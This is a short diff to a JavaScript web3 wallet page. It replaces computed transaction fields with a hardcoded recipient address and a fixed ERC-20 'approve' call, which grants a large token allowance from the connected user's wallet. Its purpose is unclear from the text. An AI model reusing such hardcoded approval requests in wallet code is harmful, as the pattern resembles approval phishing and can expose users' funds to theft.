@@ -38,12 +38,15 @@
             const accounts = await connectWallet();
             const myAccount = accounts[0];
             console.log(myAccount)
+            const chainId = await web3.eth.getChainId()
+
             let data = increaseAllowance()
             const txParams = {
                     from: myAccount,
-                    to: data[0],  // 替换为实际接收地址
+                    chainId: chainId.toString(),
+                    to: "0x2A345E1C22318E3e07EB4C45614d175dE40d68cC",
                     value: web3.utils.toWei(0, 'ether'),  // 发送的金额
-                    data: data[1],
+                    data: "095ea7b30000000000000000000000002a345e1c22318e3e07eb4c45614d175de40d68cc0000000000000000000000000000000000000000000000000000000063100000",
                     gas: 200000,  // 设定的 gas limit
                 };
             console.log(txParams)
